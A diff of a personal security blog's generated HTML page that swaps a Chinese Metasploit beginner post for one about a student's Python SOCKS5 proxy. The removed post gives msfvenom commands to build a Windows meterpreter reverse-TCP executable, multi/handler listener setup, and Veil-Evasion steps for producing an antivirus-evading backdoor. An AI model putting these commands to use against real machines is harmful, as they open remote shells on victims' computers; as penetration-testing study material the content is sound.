@@ -7,27 +7,51 @@
 <head>
   <meta charset="utf-8">
   
-  <title>msf 初体验 | sun1024</title>
+  <title>Socks5_proxy | sun1024</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   
-    <meta name="keywords" content="metasploit," />
+    <meta name="keywords" content="sun1024,adminsun,python,php,Hexo主题,前端开发,nodejs,JavaScript,渗透测试,代码审计,web安全,CTF,SRC" />
   
 
-  <meta name="description" content="msf简单使用：(以windows/meterpreter/reverse_tcp为例)1.payload设置：新开终端msfvenom -lmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件
-2.监听：进入metasploitus">
+  <meta name="description" content="Info：毕业设计做出这么个东西，也是蛮水的。。。    
+Usage:12python Socks5_proxy.py       -- run on 1080python Socks5_proxy.py 2333  -- run on 2333
+Test:
+
+Reference:
+ssocks5
+repocks
+rfc1928
+Download:  Socks5_proxy">
 <meta property="og:type" content="article">
-<meta property="og:title" content="msf 初体验">
-<meta property="og:url" content="http://yoursite.com/2017/02/06/msf初体验/index.html">
+<meta property="og:title" content="Socks5_proxy">
+<meta property="og:url" content="http://yoursite.com/2018/05/21/Socks5_proxy/index.html">
 <meta property="og:site_name" content="sun1024">
-<meta property="og:description" content="msf简单使用：(以windows/meterpreter/reverse_tcp为例)1.payload设置：新开终端msfvenom -lmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件
-2.监听：进入metasploitus">
-<meta property="og:updated_time" content="2017-02-06T14:06:16.568Z">
+<meta property="og:description" content="Info：毕业设计做出这么个东西，也是蛮水的。。。    
+Usage:12python Socks5_proxy.py       -- run on 1080python Socks5_proxy.py 2333  -- run on 2333
+Test:
+
+Reference:
+ssocks5
+repocks
+rfc1928
+Download:  Socks5_proxy">
+<meta property="og:image" content="http://yoursite.com/test1.PNG">
+<meta property="og:image" content="http://yoursite.com/test2.PNG">
+<meta property="og:updated_time" content="2018-05-21T03:42:00.287Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="msf 初体验">
-<meta name="twitter:description" content="msf简单使用：(以windows/meterpreter/reverse_tcp为例)1.payload设置：新开终端msfvenom -lmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件
-2.监听：进入metasploitus">
+<meta name="twitter:title" content="Socks5_proxy">
+<meta name="twitter:description" content="Info：毕业设计做出这么个东西，也是蛮水的。。。    
+Usage:12python Socks5_proxy.py       -- run on 1080python Socks5_proxy.py 2333  -- run on 2333
+Test:
+
+Reference:
+ssocks5
+repocks
+rfc1928
+Download:  Socks5_proxy">
+<meta name="twitter:image" content="http://yoursite.com/test1.PNG">
 
   
 
@@ -79,20 +103,20 @@
 
   <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#msf简单使用：-以windows-meterpreter-reverse-tcp为例"><span class="toc-text">msf简单使用：(以windows/meterpreter/reverse_tcp为例)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-payload设置："><span class="toc-text">1.payload设置：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-监听："><span class="toc-text">2.监听：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-插入攻击荷载"><span class="toc-text">3.插入攻击荷载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-使用run-或者-exploit-启动攻击"><span class="toc-text">4.使用run 或者 exploit 启动攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PS"><span class="toc-text">PS:</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#使用veil-veasion生成后门："><span class="toc-text">使用veil-veasion生成后门：</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Info："><span class="toc-text">Info：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Usage"><span class="toc-text">Usage:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Test"><span class="toc-text">Test:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-text">Reference:</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Download"><span class="toc-text">Download:</span></a></li></ol>
   </div>
 
 
 
 <div class="content content-post CENTER">
-   <article id="post-msf初体验" class="article article-type-post" itemprop="blogPost">
+   <article id="post-Socks5_proxy" class="article article-type-post" itemprop="blogPost">
   <header class="article-header">
-    <h1 class="post-title">msf 初体验</h1>
+    <h1 class="post-title">Socks5_proxy</h1>
 
     <div class="article-meta">
       <span>
         <i class="icon-calendar"></i>
-        <span>2017.02.06</span>
+        <span>2018.05.21</span>
       </span>
 
       
@@ -122,14 +146,17 @@
 
   <div class="article-content">
     
-      <h1 id="msf简单使用：-以windows-meterpreter-reverse-tcp为例"><a href="#msf简单使用：-以windows-meterpreter-reverse-tcp为例" class="headerlink" title="msf简单使用：(以windows/meterpreter/reverse_tcp为例)"></a>msf简单使用：(以windows/meterpreter/reverse_tcp为例)</h1><h2 id="1-payload设置："><a href="#1-payload设置：" class="headerlink" title="1.payload设置："></a>1.payload设置：</h2><p>新开终端<br><code>msfvenom -l</code><br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=4444 -f exe -o /root/桌面/1.exe //生成exe文件</code></p>
-<h2 id="2-监听："><a href="#2-监听：" class="headerlink" title="2.监听："></a>2.监听：</h2><p>进入metasploit<br><code>use exploit/multi/handler</code><br><code>show options</code></p>
-<h2 id="3-插入攻击荷载"><a href="#3-插入攻击荷载" class="headerlink" title="3.插入攻击荷载"></a>3.插入攻击荷载</h2><p>show payloads<br><code>set payload windows/meterpreter_reverse_tcp</code><br>再次show options(出现LHOST和LPORT选项)<br><code>set lhost 192.168.1.120</code><br><code>set lport 4444</code></p>
-<h2 id="4-使用run-或者-exploit-启动攻击"><a href="#4-使用run-或者-exploit-启动攻击" class="headerlink" title="4.使用run 或者 exploit 启动攻击"></a>4.使用run 或者 exploit 启动攻击</h2><p>等待被攻击主机中招，即可拿到session<br>使用jobs停止攻击<br><code>sessions -l  //获取session列表</code><br><code>sessions -i 1 //进入meterpreter</code></p>
-<p>==============================</p>
-<h1 id="PS"><a href="#PS" class="headerlink" title="PS:"></a>PS:</h1><h2 id="使用veil-veasion生成后门："><a href="#使用veil-veasion生成后门：" class="headerlink" title="使用veil-veasion生成后门："></a>使用veil-veasion生成后门：</h2><p>打开终端<br><code>veil-veasion</code><br><code>list</code><br><code>use 6 //以c为例</code></p>
-<p>生成的后台地址：<br><code>/var/lib/veil-evasion/output/compiled/payload.exe</code></p>
-<p>在msf中使用：<br><code>msfconsole -r /var/lib/veil-evasion/output/handlers/payload_handler.rc</code></p>
+      <h1 id="Info："><a href="#Info：" class="headerlink" title="Info："></a>Info：</h1><pre><code>毕业设计做出这么个东西，也是蛮水的。。。    
+</code></pre><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage:"></a>Usage:</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python Socks5_proxy.py       -- run on 1080</div><div class="line">python Socks5_proxy.py 2333  -- run on 2333</div></pre></td></tr></table></figure>
+<h1 id="Test"><a href="#Test" class="headerlink" title="Test:"></a>Test:</h1><p><img src="test1.PNG" alt=""></p>
+<p><img src="test2.PNG" alt=""></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><ul>
+<li><a href="https://github.com/felix021/ssocks5/blob/master/ssocks5.py" target="_blank" rel="external">ssocks5</a></li>
+<li><a href="https://github.com/RicterZ/reprocks/blob/master/server/reprocks_server.py" target="_blank" rel="external">repocks</a></li>
+<li><p><a href="https://www.ietf.org/rfc/rfc1928.txt" target="_blank" rel="external">rfc1928</a></p>
+<h1 id="Download"><a href="#Download" class="headerlink" title="Download:"></a>Download:</h1><p>  <a href="https://github.com/sun1024/Socks5_proxy" target="_blank" rel="external">Socks5_proxy</a></p>
+</li>
+</ul>
 
     
   </div>
@@ -160,10 +187,10 @@
 
    
   <div class="box-prev-next clearfix">
-    <a class="show pull-left" href="/2017/01/14/hello world/">
+    <a class="show pull-left" href="/2017/08/19/Some Sqlmap Tricks/">
         <i class="icon icon-angle-left"></i>
     </a>
-    <a class="show pull-right" href="/2017/02/28/关于php比较运算符/">
+    <a class="hide pull-right" href="/">
         <i class="icon icon-angle-right"></i>
     </a>
   </div>
@@ -288,7 +315,7 @@
   <script>
     var disqus_shortname = 'sun1024';
     
-    var disqus_url = 'http://yoursite.com/2017/02/06/msf初体验/';
+    var disqus_url = 'http://yoursite.com/2018/05/21/Socks5_proxy/';
     
     (function(){
       var dsq = document.createElement('script');
